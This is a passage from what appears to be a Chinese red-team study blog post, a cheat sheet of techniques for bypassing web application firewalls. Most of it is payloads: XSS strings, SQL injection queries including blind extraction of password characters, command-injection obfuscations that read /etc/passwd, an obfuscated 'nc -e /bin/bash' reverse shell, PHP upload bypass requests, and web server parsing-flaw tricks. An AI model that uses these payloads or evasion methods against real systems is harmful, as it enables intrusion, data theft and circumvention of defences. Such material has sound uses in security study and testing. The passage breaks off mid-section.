src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/06.png" alt="bypasswaf"></p><h4 id="找真实IP，绕过CDN"><a href="#找真实IP，绕过CDN" class="headerlink" title="找真实IP，绕过CDN"></a>找真实IP，绕过CDN</h4><p>云waf一般可以通过此方法绕过</p><p><strong>识别CDN</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span></code></pre><p>或者使用站长工具查看IP是否唯一等</p><p><strong>寻找真实的IP</strong><br>DNS历史解析记录<br>寻找DNS历史记录，找到后修改hos文件即可：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>site.ip138.com/www.baidu.com https:<span class="hljs-regexp">//</span>dnsdb.io<span class="hljs-regexp">/zh-cn/</span> https:<span class="hljs-regexp">//</span>x.threatbook.cn/ http:<span class="hljs-regexp">//</span>toolbar.netcraft.com/site_report?url= https:<span class="hljs-regexp">//</span>censys.io/ipv4?q=www.baidu.com http:<span class="hljs-regexp">//</span>viewdns.info/https:<span class="hljs-regexp">//</span>community.riskiq.com/home https:<span class="hljs-regexp">//</span>securitytrails.com<span class="hljs-regexp">/list/</span>apex_domain/jgbz.baidu.com</code></pre><p><strong>RSS邮箱订阅，查看邮件源码</strong><br>一般也会得到真实的IP地址，通过rss订阅的方式，可以查找到订阅的消息中真实IP<br>或者在原始信息-头信息中（unknown[xx.xx.xx.xxIP])信息</p><p><strong>服务器向外请求（DNSLOG）</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Xy--1/</span>p/<span class="hljs-number">12896599</span>.html</code></pre><p><strong>同网段子域名信息</strong><br>DNS服务器域名信息：</p><pre><code class="hljs nginx"><span class="hljs-attribute">google</span> Public DNS（<span class="hljs-number">8.8.8.8</span>，<span class="hljs-number">8.8.4.4</span>）OpenDNS（<span class="hljs-number">208.67.222.222</span>，<span class="hljs-number">208.67.220.220</span>）OpenDNS Family（<span class="hljs-number">208.67.222.123</span>，<span class="hljs-number">208.67.220.123</span>）Dyn DNS（<span class="hljs-number">216.146.35.35</span>，<span class="hljs-number">216.146.36.36</span>）Comodo Secure（<span class="hljs-number">8.26.56.26</span>，<span class="hljs-number">8.20.247.20</span>）UltraDNS（<span class="hljs-number">156.154.70.1</span>，<span class="hljs-number">156.154.71.1</span>）Norton ConnectSafe（<span class="hljs-number">199.85.126.10</span>，<span class="hljs-number">199.85.127.10</span>）</code></pre><h4 id="https降级绕过"><a href="#https降级绕过" class="headerlink" title="https降级绕过"></a>https降级绕过</h4><p>可能https有waf，http没有</p><hr><h4 id="ssl问题绕过"><a href="#ssl问题绕过" class="headerlink" title="ssl问题绕过"></a>ssl问题绕过</h4><p>所以选用一个WAF不支持但是服务器支持的算法，选用<code>TLSv1 256 bits ECDHE-RSA-AES256-SHA</code>。就可以是WAF无法识别导致绕过</p><pre><code class="hljs awk">curl --ciphers ECDHE-RSA-AES256-SHA https:<span class="hljs-regexp">//</span>waf-test.lab.local/ssl-cipher-test</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/07.png" alt="bypasswaf"><br>WAF支持的算法如下：<br><strong>SSLv3</strong></p><pre><code class="hljs autohotkey">SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_MD5SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5SSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_3DES_EDE_CBC_SHASSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_RC4_40_MD5SSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_DES40_CBC_SHA</code></pre><p><strong>TLS/1.0-1.2</strong></p><pre><code class="hljs autohotkey">TLS_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHATLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHATLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_MD5TLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_SHATLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5 = &#123; <span class="hljs-number">0</span>x000x04 &#125;TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHA = &#123; <span class="hljs-number">0</span>x000x05 &#125;TLS_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHA = &#123; <span class="hljs-number">0</span>x000x09 &#125;</code></pre><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xdxd.love<span class="hljs-regexp">/2018/</span><span class="hljs-number">09</span><span class="hljs-regexp">/10/</span>利用SSL问题绕过WAF文章分析/</code></pre><hr><h4 id="method-绕过"><a href="#method-绕过" class="headerlink" title="method 绕过"></a>method 绕过</h4><p>1）改变method，get改post，post 改上传（还有cookies传值）<br>2）改变method为不规则，比如改get，post为HELLLOXX等（某些apache版本）</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>/xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>) HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">DigApis</span> /xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>)HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></code></pre><h4 id="Heard-IP-绕过-一般应用拦截，非WAF"><a href="#Heard-IP-绕过-一般应用拦截，非WAF" class="headerlink" title="Heard IP 绕过(一般应用拦截，非WAF)"></a>Heard IP 绕过(一般应用拦截，非WAF)</h4><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-forwarded-for：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">X</span>-remote-IP：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">X</span>-originating-IP：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">x</span>-remote-addr：<span class="hljs-number">127.0.0.1</span><span class="hljs-attribute">x</span>-client-ip：<span class="hljs-number">127.0.0.1</span></code></pre><p><strong>Heard content-type 绕过</strong></p><pre><code class="hljs fortran">content-<span class="hljs-keyword">type</span>为空 content-<span class="hljs-keyword">type</span>改成其他的 content-<span class="hljs-keyword">type</span>必须指定唯一一个类型，例如 application/ octet-stream（比如安全狗）content-<span class="hljs-keyword">type</span>改成不规则的text/htm1xxxxxxContent-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> ; boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：mUltiPart/<span class="hljs-keyword">ForM</span>-<span class="hljs-keyword">dATa</span>；boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-datax；boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>，boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> boundary=<span class="hljs-number">0000</span> content-<span class="hljs-keyword">Type</span>：multipart/whatever；boundary=<span class="hljs-number">0000</span>content-<span class="hljs-keyword">Type</span>：multipart/； boundary=<span class="hljs-number">0000</span>content-<span class="hljs-keyword">Type</span>: application/octet-stream；</code></pre><hr><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>基础常用的常规语句</p><pre><code class="hljs perl">?id=alert(document[<span class="hljs-string">&#x27;cookie&#x27;</span>]) ?id=<span class="hljs-string">&quot;;location=location.hash)//#0=&#123;&#125;;alert(0) </span><span class="hljs-string">?id=%&quot;;eval(unescape(location))//#%0Aalert(0) </span><span class="hljs-string">?id=&lt;script&lt;&#123;alert(1)&#125;/&gt;&lt;/script&gt; </span><span class="hljs-string">?id=&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</span><span class="hljs-string">?id=%3cscript%3ealert(1)%3c%2fscript%3c </span><span class="hljs-string">?id=&lt;a href=&quot;</span>javas&amp;<span class="hljs-comment">#99;ript&amp;#35;alert(1);&quot;&gt;</span>id=%253c%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e?id=&lt;object+data=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;&lt;<span class="hljs-regexp">/object&gt;</span><span class="hljs-regexp">?id=1234&amp;&quot;&gt;&lt;script&gt;alert(1)&lt;/script</span>&gt;=<span class="hljs-number">1234</span>     <span class="hljs-comment">#参数名</span></code></pre><p>直接在文件名例如asp、php后加即可绕过<br>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/lcamry/</span>articles/<span class="hljs-number">5622244</span>.html</code></pre><hr><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p>简单判别诸如点以及数据库类型 ：</p><pre><code class="hljs gherkin">数据库类型丨连接符丨注释符号丨其他特殊方式丨唯一的默认表变量和函数 MSSQL|<span class="hljs-string"> %2B (URL加号编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string"> 待补充丨@@PACK_RECEIVED </span><span class="hljs-string">MYSQL</span>|<span class="hljs-string"> %20 (URL空格编码)丨# / -- </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string">  CONNECTION_ID() </span><span class="hljs-string">Oracle I %7C (URL竖线编码) </span>|<span class="hljs-string"> -- 待补充 </span>|<span class="hljs-string"> BITAND(1,1) </span><span class="hljs-string">PGsql </span>|<span class="hljs-string"> %7C (URL竖线编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string">ad1::int=1 </span>|<span class="hljs-string"> getpgusername() </span><span class="hljs-string">Access </span>|<span class="hljs-string"> %26 (URL与号编码) </span>|<span class="hljs-string"> N/A </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string"> msysobjects</span></code></pre><p>为避免被wa拦截以及封禁P,注入建议不首先使用<code>and</code>以及<code>or</code>语句。</p><p>可用如下方式替换：</p><p><strong>数字型注入：</strong></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=2*2?<span class="hljs-attribute">id</span>=4</code></pre><p><strong>字符型注入，根据上表判断</strong></p><pre><code class="hljs powershell">?key=wo<span class="hljs-string">&#x27;+&#x27;</span><span class="hljs-built_in">rd</span>?key=wo<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-built_in">rd</span>?key=wo<span class="hljs-string">&#x27; &#x27;</span><span class="hljs-built_in">rd</span></code></pre><hr><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=ord(<span class="hljs-string">&#x27;a&#x27;</span>)=<span class="hljs-number">97</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+AND+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+&amp;&amp;+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;=’</span><span class="hljs-string">?id=123+AND+md5(‘a’)!= md5(‘A’) </span><span class="hljs-string">?id=123+and+len(@@version)&gt;1 </span><span class="hljs-string">?id=1’||1=’1 </span><span class="hljs-string">?id=123‘+like+&#x27;</span><span class="hljs-number">123</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span><span class="hljs-string">&#x27;+not+like+&#x27;</span><span class="hljs-number">1234</span> <span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>&lt;&gt;<span class="hljs-string">&#x27;bbb&#x27;</span><span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*! <span class="hljs-keyword">union</span> all select version() */-- <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*!<span class="hljs-keyword">or</span>*/<span class="hljs-number">1</span>=<span class="hljs-number">1</span>; <span class="hljs-built_in">?id</span>=(<span class="hljs-number">1</span>)<span class="hljs-keyword">union</span>(((((((select(<span class="hljs-number">1</span>), hex(hash)from(users))))))))       ---<span class="hljs-number">7</span>个+<span class="hljs-number">8</span>个括号 <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-keyword">union</span>+(select’<span class="hljs-number">1</span>‘<span class="hljs-built_in">,concat</span>(login,hash)from+users) <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-meta">%55nion</span>(<span class="hljs-meta">%53elect</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)-- -<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>/*!<span class="hljs-number">000000</span><span class="hljs-keyword">union</span>*/select<span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span>/*asdas/asd asasd*/version() <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span>(select<span class="hljs-meta">%0aall</span>&#123;x users&#125;from&#123;x ddd&#125;)</code></pre><p><strong>Mysql常用函数</strong><br>字符串处理：</p><pre><code class="hljs routeros">?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=<span class="hljs-string">&#x27;*&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=0x2a?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=unhex(<span class="hljs-string">&#x27;2a&#x27;</span>) ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) regexp <span class="hljs-string">&#x27;[*]&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) like <span class="hljs-string">&#x27;*&#x27;</span> ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) rlike <span class="hljs-string">&#x27;[*]&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ord(mid(password,1,1))=42 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ascii(mid(password,1,1))=42 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> find_in_set(<span class="hljs-string">&#x27;2a&#x27;</span>,hex(mid(password,1,1)))=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> position(0x2a <span class="hljs-keyword">in</span> password)=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> locate(ox2a,password)=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substring((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substr((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0X69) = 1 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0×70) = 0?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0x71) = -1</code></pre><hr><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>‘ （单引号）以及 \ （反斜杠）绕过</strong></p><pre><code class="hljs groovy">$ echo orleven orleven$ echo o<span class="hljs-string">&#x27;r&#x27;</span>l<span class="hljs-string">&#x27;e&#x27;</span>v<span class="hljs-string">&#x27;e&#x27;</span>n<span class="hljs-string">&#x27;&#x27;</span>oreven $ <span class="hljs-regexp">/b&#x27;i&#x27;n/</span>c<span class="hljs-string">&#x27;a&#x27;</span>t <span class="hljs-regexp">/e&#x27;t&#x27;c/</span>p<span class="hljs-string">&#x27;a&#x27;</span>s<span class="hljs-string">&#x27;s&#x27;</span>w<span class="hljs-string">&#x27;d&#x27;</span> <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root:/</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin $ <span class="hljs-regexp">/b\i\n/</span>c\at <span class="hljs-regexp">/et&#x27;c&#x27;/</span>pa<span class="hljs-string">&#x27;s&#x27;</span>swd <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><hr><p><strong>? 、 * 、 [、 ]、 ^、 - 通配符绕过</strong></p><p>问号最好只匹配到唯一一条</p><pre><code class="hljs gradle">$ <span class="hljs-regexp">/b??/</span>c?t <span class="hljs-regexp">/etc/</span>??ss?droot: X: <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: root: <span class="hljs-regexp">/root: /</span>bin/bash daemon: x: <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: daemon: <span class="hljs-regexp">/usr/</span>sbin: <span class="hljs-regexp">/usr/</span>sbin/nologin bin: X: <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: bin:<span class="hljs-regexp">/bin: /u</span>sr<span class="hljs-regexp">/sbin/</span>nologin $ <span class="hljs-regexp">/???/</span>n? -e <span class="hljs-regexp">/???/</span>b??h <span class="hljs-number">2130706433</span> <span class="hljs-number">1337</span> # <span class="hljs-regexp">/bin/</span>nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1337</span></code></pre><hr><p><strong>$ 不存在的符号</strong></p><pre><code class="hljs groovy">cat $u<span class="hljs-regexp">/etc$u/</span>passwd$u <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span> <span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><p><strong>; 分号执行</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cat /etc/passwd;ls .......<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110:115</span><span class="hljs-symbol">:MySQL</span> Serve,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span> a.out go gobuster gopath soft sqlmap.log tool</code></pre><hr><h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p><strong>文件名绕过</strong></p><pre><code class="hljs perl"><span class="hljs-number">1</span>）文件名加回车<span class="hljs-number">2</span>）shell.php(%80-%99).jpg 绕过<span class="hljs-number">3</span>）如果有改名功能，可先上传正常文件，再改名 <span class="hljs-number">4</span>）%00<span class="hljs-number">5</span>）<span class="hljs-number">00</span>(<span class="hljs-keyword">hex</span>)<span class="hljs-number">6</span>）长文件名（windows <span class="hljs-number">258</span>byte | linux <span class="hljs-number">4096</span>byte ），可使用非字母数字，比如中文等最大程度的拉长。 <span class="hljs-number">7</span>）重命名</code></pre><p><strong>脚本后缀</strong></p><pre><code class="hljs awk">Php<span class="hljs-regexp">/php3/</span>php<span class="hljs-regexp">/php5/</span>php6<span class="hljs-regexp">/pht/</span>phpt/phtml asp<span class="hljs-regexp">/cer/</span>asa<span class="hljs-regexp">/cdx/</span>aspx<span class="hljs-regexp">/ashx/</span>ascx/asax jsp<span class="hljs-regexp">/jspx/i</span>spf</code></pre><p><strong>解析漏洞</strong></p><p>服务器特性:<br>1.会将Request中的不能编码部分的%去掉<br>2.Request中如果有unicode部分会将其进行解码</p><p><strong>IIS</strong></p><p>lIS6.0两个解析缺陷：目录名包含<code>.asp</code>、<code>.asa</code>、<code>.cer</code>的话，则该目录下的所有文件都将按照asp解析</p><p>例如:</p><p><code>/abc.asp/1.jpg</code> 会当做<code> /abc.asp</code> 进行解析<br><code>/abc.php/1.jpg</code> 会当做 <code>/abc.php</code> 进行解析</p><p><strong>Apache1.X 2.X解析漏洞</strong></p><p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p><p><strong>Nginx</strong></p><p>以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell. jpg，然后以shell.j pg.php进行请求</p><pre><code class="hljs markdown">• Nginx 0.5.<span class="hljs-emphasis">*</span><span class="hljs-emphasis">• Nginx 0.6.*</span>• Nginx 0.7 &lt;= 0.7.65• Nginx 0.8 &lt;= 0.8.37</code></pre><p>以上Nginx容器器的版本下，上传⼀个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><pre><code class="hljs plain">• Nginx 0.8.41 – 1.5.6：</code></pre><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><p><strong>PHP CGI 解析漏洞</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">IIS</span> <span class="hljs-number">7</span>.<span class="hljs-number">0</span>/<span class="hljs-number">7</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Nginx</span> &lt; <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">3</span></code></pre><p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">337</span></code></pre><p><strong>系统特性：利用NTFS ADS特性</strong></p><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</p><pre><code class="hljs stata"><span class="hljs-keyword">test</span>.asp.<span class="hljs-keyword">test</span>.asp(空格)<span class="hljs-keyword">test</span>.php:1.jpg<span class="hljs-keyword">test</span>.php: <span class="hljs-variable">$DATA</span><span class="hljs-keyword">test</span>.php_</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/08.png" alt="系统特性"><br>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/1189">https://xz.aliyun.com/t/1189</a></li></ul><hr><p><strong>协议解析不一致，绕过waf（注入跨站也可尝试）</strong></p><p>因为这种不仅仅存在于上传之处，注入跨站也可尝试</p><p><strong>垃圾数据</strong></p><pre><code class="hljs php">-------------WebkitFormBoundaryFADasdasdasDdasdContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>, filename=<span class="hljs-string">&#x27;abc.php&#x27;</span>;aaaaaaaaaaaaaaaa Content-Type: application/octet-stream；<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><hr><p><strong>文件类型绕过/Header 头类型</strong></p><p>修改文件类型绕过<code>/Header</code>头的<code>Content-Type</code>，多次尝试:</p><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>：application/x-www-<span class="hljs-keyword">form</span>-urlencoded；Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>； Content-<span class="hljs-keyword">Type</span>：application/octet-stream；</code></pre><p><strong>文件名解析兼容性</strong></p><p>利用<code>filename</code>兼容性，多次修改常识<code>Content-Disposition</code>，多次尝试:</p><pre><code class="hljs routeros">Content-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=bc.phpContent-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;bc.php</span><span class="hljs-string">Content-Disposition：form-data; name=&quot;</span>file&quot;; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;bc.php&#x27;</span></code></pre><p><strong>未解析所有文件</strong></p><p><code>multipart协议</code>中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_32393893/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81625047</span></code></pre><p><strong>不规则Content-Disposition文件名覆盖</strong></p><pre><code class="hljs http">-------------WebkitFormBoundaryFADasdasdasDdasdcontent-Dispositiona：form-data; name=&quot;file&quot;; filename=&#x27;abc.jpg&#x27; Content-Disposition：form-data; name=&quot;file&quot;; filename=abc.php&#x27;<span class="hljs-attribute">Content-Type</span>: application/octet-stream; &lt;?php phpinfo(); ?&gt;-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700">https://weibo.com/ttarticle/p/show?id=2309404007261092631700</a></li></ul><p>文章讲解了Content-Disposition各种不规则绕过方法</p><hr><p><strong>boundary 绕过</strong></p><p>boundary边界不一致(Win2k3 + llS6.0 + ASP)</p><pre><code class="hljs llvm"><span class="hljs-number">1</span>）<span class="hljs-variable">%u</span>特性: iis支持对unicode的解析，如:payload为[s<span class="hljs-variable">%u006c</span><span class="hljs-variable">%u0006ect</span>]<span class="hljs-punctuation">,</span>解析出来后则是[<span class="hljs-keyword">select</span>]     <span class="hljs-variable">%u0061nd</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>    另类<span class="hljs-variable">%u</span>特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。    如：<span class="hljs-keyword">select</span>中的e对应的unicode为<span class="hljs-variable">%u0065</span>，但是<span class="hljs-variable">%u00f0</span>同样会被转换成为e s<span class="hljs-variable">%u00f0lect</span>    iis+asp    